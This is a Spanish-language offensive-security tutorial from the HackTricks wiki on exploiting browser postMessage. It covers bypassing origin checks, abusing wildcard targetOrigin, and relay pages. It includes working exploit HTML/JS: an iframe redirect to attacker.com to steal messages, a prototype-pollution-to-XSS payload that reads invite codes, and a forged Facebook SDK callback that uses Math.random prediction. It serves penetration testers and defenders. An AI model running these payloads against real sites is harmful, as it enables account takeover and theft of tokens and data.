# PostMessage Vulnerabilidades

{{#include ../../banners/hacktricks-training.md}}

## Enviar **PostMessage**

**PostMessage** usa la siguiente función para enviar un mensaje:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Ten en cuenta que **targetOrigin** puede ser un '\*' o una URL como _https://company.com._\
En el **segundo escenario**, el **mensaje solo puede enviarse a ese dominio** (incluso si el origin del Window object es diferente).\
Si se usa el **wildcard**, **los mensajes podrían enviarse a cualquier dominio**, y serán enviados al origin del Window object.

### Atacando iframe & wildcard en **targetOrigin**

Como se explica en [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) si encuentras una página que puede ser **iframed** (sin protección `X-Frame-Header`) y que está **enviando mensajes sensibles** vía **postMessage** usando un **wildcard** (\*), puedes **modificar** el **origin** del **iframe** y **leak** el **mensaje sensible** a un dominio controlado por ti.\
Ten en cuenta que si la página puede ser iframed pero el **targetOrigin** está **set to a URL and not to a wildcard**, este **truco no funcionará**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** es la función que usa JS para declarar la función que está **esperando `postMessages`**.\
Se usará un código similar al siguiente:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note en este caso cómo lo **primero** que hace el código es **comprobar el origen**. Esto es terriblemente **importante**, sobre todo si la página va a hacer **algo sensible** con la información recibida (por ejemplo, cambiar una contraseña). **Si no comprueba el origen, los atacantes pueden hacer que las víctimas envíen datos arbitrarios a estos endpoints** y cambiar las contraseñas de las víctimas (en este ejemplo).

### Enumeración

Para **encontrar event listeners** en la página actual puedes:

- **Buscar** en el código JS `window.addEventListener` y `$(window).on` (_versión JQuery_)
- **Ejecutar** en la consola de developer tools: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Ir a** _Elements --> Event Listeners_ en las developer tools del navegador

![](<../../images/image (396).png>)

- Usar una **extensión del navegador** como [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) o [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Estas extensiones interceptarán **todos los mensajes** y te los mostrarán.

### Origin check bypasses

- El atributo **`event.isTrusted`** se considera seguro ya que devuelve `True` solo para eventos generados por acciones genuinas del usuario. Aunque es difícil de bypassear si se implementa correctamente, su importancia en las comprobaciones de seguridad es notable.
- El uso de **`indexOf()`** para la validación del origen en eventos PostMessage puede ser susceptible de bypass. Un ejemplo que ilustra esta vulnerabilidad es:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- El método **`search()`** de `String.prototype.search()` está pensado para expresiones regulares, no para cadenas. Pasar cualquier cosa que no sea un regexp conduce a una conversión implícita a regex, haciendo el método potencialmente inseguro. En regex, un punto (.) actúa como un comodín, lo que permite evitar validaciones con dominios especialmente formados. Por ejemplo:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- La función **`match()`**, similar a `search()`, procesa regex. Si la regex está mal estructurada, podría ser susceptible a bypass.
- La función **`escapeHtml`** pretende sanear entradas escapando caracteres. Sin embargo, no crea un nuevo objeto escapado sino que sobreescribe las propiedades del objeto existente. Este comportamiento puede ser explotado. En particular, si un objeto puede ser manipulado de modo que su propiedad controlada no reconozca `hasOwnProperty`, `escapeHtml` no funcionará como se espera. Esto se demuestra en los ejemplos siguientes:

- Falla esperada:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypass del escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

En el contexto de esta vulnerabilidad, el objeto `File` es especialmente explotable debido a su propiedad de solo lectura `name`. Esta propiedad, cuando se usa en plantillas, no es sanitizada por la función `escapeHtml`, lo que puede llevar a riesgos de seguridad.

- La propiedad `document.domain` en JavaScript puede ser establecida por un script para acortar el dominio, permitiendo una política de same-origin más relajada dentro del mismo dominio padre.

### Origin-only trust + trusted relays

Si un receptor solo comprueba **`event.origin`** (p. ej., confía en cualquier `*.trusted.com`) a menudo puedes encontrar una página **"relay" en ese origin que refleja parámetros controlados por el atacante vía `postMessage`** hacia un `targetOrigin`/`targetWindow` suministrado. Ejemplos incluyen gadgets de marketing/analytics que toman query params y reenvían `{msg_type, access_token, ...}` a `opener`/`parent`. Puedes:

- **Abrir la página de la víctima en un popup/iframe que tenga un `opener`** para que sus handlers se registren (muchos pixels/SDKs solo adjuntan listeners cuando `window.opener` existe).
- **Navegar otra ventana del atacante al endpoint relay en el origin de confianza**, rellenando los campos de mensaje que quieres inyectar (tipo de mensaje, tokens, nonces).
- Como el mensaje ahora proviene **del origin de confianza**, la validación solo por origin pasa y puedes desencadenar comportamientos privilegiados (cambios de estado, llamadas a APIs, escrituras en el DOM) en el listener de la víctima.

Patrones de abuso vistos en la práctica:

- Analytics SDKs (p. ej., estilo pixel/fbevents) consumen mensajes como `FACEBOOK_IWL_BOOTSTRAP`, luego **llaman a APIs backend usando un token suministrado en el mensaje** e incluyen **`location.href` / `document.referrer`** en el cuerpo de la petición. Si proporcionas tu propio token, puedes **leer estas peticiones en el historial/registros de solicitudes del token** y exfiltrar **códigos/tokens OAuth** presentes en la URL/referrer de la página víctima.
- Cualquier relay que refleje campos arbitrarios en `postMessage` te permite **suplantar tipos de mensaje** que esperan listeners privilegiados. Combina esto con validaciones de entrada débiles para alcanzar llamadas Graph/REST, desbloqueo de funcionalidades o flujos equivalentes a CSRF.

Consejos de búsqueda: enumera listeners de `postMessage` que solo comprueban `event.origin`, luego busca **endpoints HTML/JS del mismo origin que reenvíen params de URL vía `postMessage`** (previews de marketing, popups de login, páginas de error OAuth). Junta ambos con `window.open()` + `postMessage` para evadir las comprobaciones de origen.

### e.origin == window.origin bypass

Al embeber una página web dentro de un **sandboxed iframe** usando %%%%%%, es crucial entender que el origin del iframe se establecerá en null. Esto es especialmente importante cuando se trata de atributos sandbox y sus implicaciones en seguridad y funcionalidad.

Al especificar **`allow-popups`** en el atributo sandbox, cualquier ventana popup abierta desde dentro del iframe hereda las restricciones del sandbox de su padre. Esto significa que a menos que también se incluya el atributo **`allow-popups-to-escape-sandbox`**, el origin de la ventana popup también se establecerá en `null`, alineándose con el origin del iframe.

En consecuencia, cuando se abre un popup en estas condiciones y se envía un mensaje desde el iframe al popup usando **`postMessage`**, ambos extremos (emisor y receptor) tienen su origin establecido en `null`. Esto conduce a una situación en la que **`e.origin == window.origin`** evalúa a true (`null == null`), porque tanto el iframe como el popup comparten el mismo valor de origin `null`.

Para más información **lee**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Evitar e.source

Es posible comprobar si el mensaje vino de la misma ventana en la que el script está escuchando (especialmente interesante para los **Content Scripts de extensiones del navegador** para verificar si el mensaje fue enviado desde la misma página):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Puedes forzar **`e.source`** de un mensaje a ser null creando un **iframe** que **envía** el **postMessage** y es **eliminado inmediatamente**.

Para más información **lee:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Para realizar estos ataques, idealmente podrás **colocar la página web víctima** dentro de un `iframe`. Pero algunas cabeceras como `X-Frame-Header` pueden **impedir** ese **comportamiento**.\
En esos escenarios aún puedes usar un ataque menos sigiloso. Puedes abrir una nueva pestaña hacia la aplicación web vulnerable y comunicarte con ella:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Robar mensaje enviado al iframe hijo bloqueando la página principal

En la siguiente página puedes ver cómo podrías robar **datos sensibles de postmessage** enviados a un **iframe hijo** al **bloquear** la **página principal** antes de enviar los datos y abusando de un **XSS en el iframe hijo** para **leak los datos** antes de que sean recibidos:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Robar mensaje modificando el location del iframe

Si puedes iframear una webpage sin X-Frame-Header que contenga otro iframe, puedes **cambiar el location de ese iframe hijo**, así si está recibiendo un **postmessage** enviado usando un **wildcard**, un atacante podría **cambiar** ese **origin** del iframe a una página **controlada** por él y **robar** el mensaje:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage para Prototype Pollution y/o XSS

En escenarios donde los datos enviados a través de `postMessage` son ejecutados por JS, puedes **iframear** la **página** y **explotar** el **prototype pollution/XSS** enviando el exploit vía `postMessage`.

Un par de **muy bien explicados XSS a través de `postMessage`** pueden encontrarse en [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Ejemplo de un exploit para abusar de **Prototype Pollution y luego XSS** mediante un `postMessage` a un `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Para **más información**:

- Link to page about [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link to page about [**XSS**](../xss-cross-site-scripting/index.html)
- Link to page about [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Predicción de tokens de callback de **`Math.random()`** en puentes postMessage

Cuando la validación de mensajes usa un “secreto compartido” generado con `Math.random()` (p. ej., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) y el mismo helper también nombra los iframes de plugin, puedes recuperar salidas del PRNG y forjar mensajes de confianza:

- **Leak PRNG outputs via `window.name`:** El SDK nombra automáticamente los iframes de plugin con `guid()`. Si controlas el frame superior, carga la página víctima en un iframe, luego navega el iframe del plugin a tu origen (p. ej., `window.frames[0].frames[0].location='https://attacker.com'`) y lee `window.frames[0].frames[0].name` para obtener una salida cruda de `Math.random()`.
- **Forzar más salidas sin recargas:** Algunos SDK exponen una ruta de reinit; en el FB SDK, disparar `init:post` con `{xfbml:1}` fuerza `XFBML.parse()`, destruye/crea de nuevo el iframe del plugin y genera nuevos nombres/IDs de callback. Repetir la reinit produce tantas salidas del PRNG como necesites (ten en cuenta llamadas internas extra a `Math.random()` para IDs de callback/iframe, por lo que quien resuelva debe saltarse valores intermedios).
- **Entrega desde origen confiable vía parameter pollution:** Si un endpoint de plugin first-party refleja un parámetro no saneado en la payload cross-window (p. ej., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), puedes inyectar `&type=...&iconSVG=...` preservando el origin confiable `facebook.com`.
- **Predecir el siguiente callback:** Convierte los nombres de iframe filtrados de nuevo a floats en `[0,1)` y alimenta varios valores (incluso no consecutivos) a un predictor de `Math.random` de V8 (p. ej., basado en Z3). Genera el siguiente `guid()` localmente para forjar el token de callback esperado.
- **Activar el sink:** Fabrica los datos de postMessage para que el bridge despache `xd.mpn.setupIconIframe` e inyecte HTML en `iconSVG` (p. ej., `<img src=x onerror=...>` codificado en URL), logrando DOM XSS dentro del origin anfitrión; desde ahí, se pueden leer iframes same-origin (OAuth dialogs, arbiters, etc.).
- **Peculiaridades de framing ayudan:** La cadena requiere framing. En algunos webviews móviles, `X-Frame-Options` puede degradar a `ALLOW-FROM` no soportado cuando `frame-ancestors` está presente, y parámetros de “compat” pueden forzar `frame-ancestors` permisivos, habilitando el canal lateral `window.name`.

#### Ejemplo mínimo de mensaje forjado
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Referencias

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Para practicar: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
